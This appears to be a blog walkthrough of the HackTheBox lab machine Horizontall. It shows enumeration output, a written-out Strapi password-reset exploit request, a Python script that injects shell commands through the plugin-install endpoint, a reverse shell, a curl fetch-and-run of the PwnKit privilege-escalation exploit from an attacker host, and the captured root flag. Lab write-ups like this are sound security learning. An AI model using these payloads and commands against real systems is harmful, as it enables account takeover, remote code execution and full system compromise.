OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Takeaway:\n nginx web server running on :80 OpenSSH 7.6p1 SSH server on :22 Ubuntu OS  _http-title: Did not follow redirect to http://horizontall.htb\nWe can see a redirect to a URL. Let\u0026rsquo;s add it to our /etc/hosts file:\nsudo echo \u0026quot;10.10.11.105 horizontall.htb\u0026quot; \u0026gt;\u0026gt; /etc/hosts\nI left an all port scan in the background afterwards, but it did not give any additional results.\nwhatweb Whatweb didn\u0026rsquo;t give us any more information than nmap already did.\nhttp://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux] [nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0] horizontall.htb I connected to this URL and was greeted by this:\n Landing page \nScrolling down, I noticed what seemed like a contact form of some sort:\n Contact form \nI did my best attempt at an XSS script, but after writing it I noticed that the \u0026ldquo;Send\u0026rdquo; button has no JS attached to it. So this attack surface, at least, was not likely.\nNext, I decided to try and brute-force some hidden files and directories with gobuster.\ngobuster @ horizontall.htb I did a quick peek with the dirb/big.txt wordlist, but did not find anything of interest:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: conf,php,txt,asp,aspx [+] Timeout: 10s =============================================================== 2022/02/04 16:14:11 Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/css/] /favicon.ico (Status: 200) [Size: 4286] /img (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/img/] /js (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/js/] =============================================================== 2022/02/04 16:28:50 Finished =============================================================== I pondered running a larger wordlist, but decided to check out the SSH service before coming back for a second try.\nSSH Service (rabbit hole) What caught my eye after the nmap scan, was the OpenSSH 7.6p1 version of the SSH service. A quick search on exploit-db.com found multiple possible vulnerabilities. What solidified my belief, was the CVE 2018-15473 exploit named OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration. It seemed as though the box\u0026rsquo;s version was succeptible. After attempting both manually running the scripts on exploit-db.com as well as trying them out automatically via Metasploit, I realized that the server does not leak existing usernames. Rather, it reports all usernames as valid.\nAs such, using a brute-force or dictionary attack via Hydra or something similar was also something I closed the book on.\nAlthough, the machine had the tag \u0026ldquo;CMS\u0026rdquo;, however we only ever saw a landing page. Is there something we missed? Where is this CMS?\nwfuzz subdomains With nowhere else to go, I tried to enumerate possible subdomains. I used the amazing subdomains-top1million-110000.txt wordlist from the SecLists repository that I very much recommend.\nwfuzz -c -f subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#39;http://horizontall.htb\u0026#39; -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; We found one subdomain out of the ~114000 -\u0026gt; api-prod\nLet\u0026rsquo;s quickly add it to our hosts file and check it out!\nsudo echo \u0026quot;10.10.11.105 api-prod.horizontall.htb\u0026quot; \u0026gt;\u0026gt; /etc/hosts\napi-prod.horizontall.htb Upon connecting, I was greeted with a very underwhelming screen:\n api-prod.horizontall.htb \nThe source code did not give any particularly interesting leads, and so, I went for another gobuster run.\ngobuster @ api-prod.horizontall.htb Looking for clues, I started another gobuster run, this time with a much larger wordlist, just in case, directory-list-2.3-big.txt from the aforementioned SecLists repo.\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://api-prod.horizontall.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/04 17:17:09 Starting gobuster in directory enumeration mode =============================================================== /reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854] Very quickly, I found some hidden directories and went to check them out.\napi-prod.horizontall.htb/reviews Even though I was barred from checking out the much more interesting /users endpoint, I wanted to see what /reviews had in store also. Unfortunately, it wasn\u0026rsquo;t anything noteworthy, apart from a few usernames. They seemed more like customers than anything resembling a privileged user on the system, so I disregarded this lead as a red herring.\n Reviews \n/admin seemed like the juiciest bit anyway, so let\u0026rsquo;s go there.\napi-prod.horizontall.htb/admin My hopes were reignited when I saw this login screen.\n Strapi CMS Admin Log-in \nTrying out a few commonly used passwords did not prove fruitful. Neither did the \u0026ldquo;Forgot your password?\u0026rdquo; screen.\n Strapi CMS ‘Forgot your password?' \nA search on exploit-db.com for strapi CMS returned three possible vulnerabilities - an unauthenticated password reset and two RCEs, one requiring authentication and one not. However, I did not know the version of Strapi used here. I was unsure whether or not the exploits would work.\nBefore trying them out, since this is a log-in screen after all, SQL injection sprung into my mind. I booted up Burp Suite and sqlmap.\nExploitation sqlmap with Burp Suite (rabbit hole) I saved a random login request with Burp for use with sqlmap:\nPOST /admin/auth/local HTTP/1.1 Host: api-prod.horizontall.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api-prod.horizontall.htb/admin/auth/login Content-Type: application/json Origin: http://api-prod.horizontall.htb Content-Length: 44 DNT: 1 Connection: close {\u0026quot;identifier\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;password\u0026quot;} However, sqlmap wasn\u0026rsquo;t successful neither with the identifier, nor the password field.\nWelp, time to try out that password reset and those RCEs.\nSet Password (Unauthenticated) First of all, I tried the password reset exploit (CVE 2019-18818). My reasoning was to try this first, and the RCE exploits after, specifically, the one that requires authentication, I thought it might have a higher chance of success than the one not needing authentication.\nUnfortunately, the exploit\u0026rsquo;s Python script did not work correctly out of the box, I was hit by an error regarding the json package used. Not wanting to mess around with installing a different version of Python or reinstalling different packages, I skimmed through the code and found a point of interest.\nprint(\u0026#34;[*] Password reset for user: {}\u0026#34;.format(userEmail)) resetPasswordReq={\u0026#34;email\u0026#34;:userEmail, \u0026#34;url\u0026#34;:\u0026#34;{}/admin/plugins/users-permissions/auth/reset-password\u0026#34;.format(strapiUrl)} s.post(\u0026#34;{}/\u0026#34;.format(strapiUrl), json=resetPasswordReq) # Set new password print(\u0026#34;[*] Setting new password\u0026#34;) exploit={\u0026#34;code\u0026#34;:{}, \u0026#34;password\u0026#34;:newPassword, \u0026#34;passwordConfirmation\u0026#34;:newPassword} r=s.post(\u0026#34;{}/admin/auth/reset-password\u0026#34;.format(strapiUrl), json=exploit) The code seems to simply send a specially formatted JSON to the aforementioned \u0026lsquo;Forgot your password?\u0026rsquo; URL. Fortunately for me, I had just saved the login request with Burp Suite, when I was messing around with sqlmap. With a quick change of the Host: header and swapping out the login JSON payload for the password reset one, I had my exploit ready to go:\nPOST /admin/auth/reset-password HTTP/1.1 Host: api-prod.horizontall.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api-prod.horizontall.htb/admin/auth/login Content-Type: application/json Origin: http://api-prod.horizontall.htb Content-Length: 146 DNT: 1 Connection: close {\u0026quot;code\u0026quot; : {\u0026quot;$gt\u0026quot;:0}, \u0026quot;password\u0026quot; : \u0026quot;SuperStrongPassword1\u0026quot;, \u0026quot;passwordConfirmation\u0026quot; : \u0026quot;SuperStrongPassword1\u0026quot; } I hit send on Burp Suite and cross my fingers\u0026hellip;\nI\u0026rsquo;m met with a 200 OK reply! Along with an accompanying JWT token, admin username and email address!\nHTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Fri, 04 Feb 2022 17:42:52 GMT Content-Type: application/json; charset=utf-8 Content-Length: 249 Connection: close Vary: Origin Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true Content-Security-Policy: img-src 'self' http:; block-all-mixed-content Strict-Transport-Security: max-age=31536000; includeSubDomains X-Frame-Options: SAMEORIGIN X-XSS-Protection: 1; mode=block X-Powered-By: Strapi \u0026lt;strapi.io\u0026gt; {\u0026quot;jwt\u0026quot;:\u0026quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk2NTcyLCJleHAiOjE2NDY1ODg1NzJ9.38OEmWdTXIBVRZid4mcY6JeZ2pBV4GQi2_SMHGafhec\u0026quot;,\u0026quot;user\u0026quot;:{\u0026quot;id\u0026quot;:3,\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;admin@horizontall.htb\u0026quot;,\u0026quot;blocked\u0026quot;:null}} Let\u0026rsquo;s try that log-in now :3\nAdmin log-in @ api-prod.horizontall.htb/admin Logging in with the SuperStrongPassword1 after the password reset exploit proved successful. I landed in what seemed like an admin dashboard.\n Strapi CMS Admin Dashboard \nWhat instantly caught my eye was the Files Upload tab in the Plugins section. Sure enough, I could upload a file. I went to PayloadsAllTheThings for inspiration, crafted and uploaded myself a PHP reverse shell payload.\n Reverse shell upload \nUnfortunately, I did not have much success with uploaded files getting to run. Without dwelling too much on it, I decided to try out the RCE exploits I found before. The Strapi version didn\u0026rsquo;t seem that different from the password reset exploit, so I had fairly high hopes.\nRemote Code Execution (RCE) (Authenticated) \u0026amp; User Flag While working with the RCE exploit I also again encountered some Python weirdness. Mostly regarding the JWT token. I was used to it at this point, so I just duct-taped bits and pieces of both RCE exploits, as they seemed to target the same /admin/plugins/install path, hard-coded in the JWT and target URL. At the end, it looked like this:\nimport requests from cmd import Cmd class Terminal(Cmd): prompt = \u0026#34;$\u0026gt; \u0026#34; def default(self, args): code_exec(args) def code_exec(cmd): global jwt, url jwt = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk4MTkwLCJleHAiOjE2NDY1OTAxOTB9.fw_8CAfFHcZbgprQaa9LTA771Vz0UI6WyvgvynMKYyI\u0026#34; url = \u0026#34;http://api-prod.horizontall.htb\u0026#34; headers = {\u0026#34;Authorization\u0026#34; : f\u0026#34;Bearer {jwt}\u0026#34;} data = {\u0026#34;plugin\u0026#34; : f\u0026#34;documentation \u0026amp;\u0026amp; $({cmd})\u0026#34;, \u0026#34;port\u0026#34; : \u0026#34;1337\u0026#34;} out = requests.post(f\u0026#34;{url}/admin/plugins/install\u0026#34;, json = data, headers = headers) print(out.text) if __name__ == (\u0026#34;__main__\u0026#34;): terminal = Terminal() terminal.cmdloop() While the exploit did seem to do something, it would always respond with a \u0026ldquo;Bad Request\u0026rdquo; HTTP reply, instead of the output of id or whatever else I tried to execute. I then tried to give myself a proper reverse shell. I used RevShells to help me out crafting the command itself.\n User Access \nAnd I got myself a shell! I checked out /home and grabbed the user flag :)\n User Flag \nIt was now time to try and get root access.\nPrivilege Escalation SUDO and SUID enumeration One of the ways to privesc to root, that require very little effort, is finding easily exploitable binaries that we can either run as SUDO or that have their SUID bit set on.\nLet\u0026rsquo;s look for SUDO access first.\nsudo -l I was requested a password, so this avenue won\u0026rsquo;t work.\nNext, I tried to look for easily exploitable binaries with SUID bits.\nfind / -perm -u=s -type f 2\u0026gt;/dev/null I tried cross-referencing the output with the SUID list over at GTFOBins, but did not find anything out of the ordinary.\nLinux Exploit Suggester On my host machine, I made myself an SSH key and pasted the public key over into .ssh/authorized_keys on the strapi account. I could now log-in via SSH normally and not rely on the fragile reverse shell anymore.\nNext, I curl\u0026rsquo;d myself the Linux Exploit Suggester onto the remote machine and let it do its thing.\nstrapi@horizontall:~$ ./les.sh Available information: Kernel version: 4.15.0 Architecture: x86_64 Distribution: ubuntu Distribution version: 18.04 Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed Package listing: from current OS Searching among: 78 kernel space exploits 49 user space exploits Possible Exploits: [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main Seeing the PwnKit exploit pop-up made me smile. I was listening to SANS Internet Stormcenter Podcast a few days ago and heard about a new pollkit exploit (\u0026quot;PwnKit\u0026quot; CVE-2021-4034) floating around, making pretty much every single Linux machine vulnerable since 2009. This makes a lot of the CTF machines vulnerable to something other than what was likely intended by its designer. I pondered on looking for the \u0026lsquo;intended\u0026rsquo; exploit, but I had spent a considerable amount of time just getting to this point, I knew that getting root access otherwise would take me equally as long if the journey there was as involved as getting the initial foothold. I decided that an exploit is an exploit and just went with the PwnKit route.\nPwnKit \u0026amp; System Flag Applying the exploit was trivial. LES had even given me a download link. And just like with LES, I curl\u0026rsquo;d myself the exploit onto the remote machine and ran it. The exploit zoomed by extremely quickly, and I was now root. I went and snatched the system flag. And that\u0026rsquo;s it for Horizontall.\nstrapi@horizontall:~$ curl 10.10.14.130:8080/pwnkit -o pwnkit % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14688 100 14688 0 0 103k 0 --:--:-- --:--:-- --:--:-- 103k strapi@horizontall:~$ chmod +x pwnkit strapi@horizontall:~$ ./pwnkit root@horizontall:/opt/strapi# id uid=0(root) gid=0(root) groups=0(root),1001(strapi) root@horizontall:/opt/strapi# whoami root root@horizontall:/opt/strapi# cd ~ root@horizontall:~# ls boot.sh pid restart.sh root.txt root@horizontall:~# cat root.txt ed9440c3385bdec9f943c2cc3c0af71e root@horizontall:~# NOTE: If you would like to read the \u0026lsquo;intended\u0026rsquo; or \u0026lsquo;proper\u0026rsquo; way of the gaining root access, involving a Laravel Debug Mode RCE, I strongly recommend 0xdf\u0026rsquo;s writeup of Horizontall.\nOutro And that\u0026rsquo;s that. In the future, I will probably go through HackTheBox\u0026rsquo;s \u0026lsquo;Starting Point\u0026rsquo; set of machines. I planned on doing so from the start, but I wanted to try my hand at one of the \u0026lsquo;Easy\u0026rsquo; boxes rather than going for the \u0026lsquo;Very Easy\u0026rsquo; ones, to give myself a sort of reality check and to better gauge how much knowledge and understanding I have right now.\nWhilst doing this box, not counting the PwnKit exploit, I feel like I went the hard way about it. There were faster, less conspicuous and smarter way to achieve the same result. The api-prod subdomain was hidden in one of the minified .js files of the landing page, for example, thus avoiding the lengthy brute-forcing of subdomains.\nI was pretty easily led astray by various red herrings, like the file upload plugin on the admin dashboard or after seeing the version of the SSH service. However, I\u0026rsquo;m still a beginner, so I believe noticing these things sooner requires time and experience.\nAll in all, I feel like I have many areas to improve in, but at the same time, I\u0026rsquo;m glad I didn\u0026rsquo;t got completely stumped by one of the slightly more challenging boxes. :)\n","date":"2022-02-05T20:55:12+02:00","image":"https://weaponizedpeach.github.io/p/hackthebox-horizontall/cover_hu82ede2475d2d2a0855023287a2ed0fa7_240849_120x120_fill_box_smart1_3.png","permalink":"https://weaponizedpeach.github.io/p/hackthebox-horizontall/","title":"HackTheBox: Horizontall"}]